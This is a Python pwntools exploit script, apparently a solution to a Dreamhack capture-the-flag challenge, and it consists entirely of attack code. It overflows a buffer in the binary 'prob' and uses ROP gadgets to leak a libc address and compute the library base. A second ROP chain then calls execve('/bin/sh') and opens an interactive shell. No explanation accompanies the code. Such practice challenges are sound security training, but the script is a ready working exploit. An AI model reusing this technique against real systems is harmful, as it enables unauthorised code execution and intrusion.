from pwn import *
from time import sleep

#p = remote('localhost',8000)
# p = remote("host3.dreamhack.games",13417)
e = context.binary = ELF("prob")
libc = ELF("libc.so.6")

p = process()

pop_rdi = 0x401203
pop_rbp = 0x4012e8
ret = 0x4012c6
push_rbp_pop_rdi = 0x00000000004011FF
leave_ret = 0x4012C5

puts_got = 0x404000
vuln = 0x40127A
main = 0x4012C7

payload = b"A"*16 + p64(0x404010) + p64(push_rbp_pop_rdi) + p64(0x00000000004012A9)

p.sendafter(b"> \n",payload)

libc.address = u64(p.recvline()[:-1].ljust(8,b"\x00")) - libc.symbols['setvbuf']
success(f"libc base addr : {hex(libc.address)}")

movsxd_rdx_rcx = 0x143115+libc.address
pop_rsi = 0x163f88+libc.address
pop_rdx_rbx = 0x904fe+libc.address
payload = p64(0)*3 + p64(movsxd_rdx_rcx) + p64(0x00000000004012BF)
sleep(1)
p.send(payload)

payload = b"A"*0x20
payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx_rbx) + p64(0) + p64(0)
payload += p64(libc.symbols['execve'])
sleep(1)
p.send(payload)

p.interactive()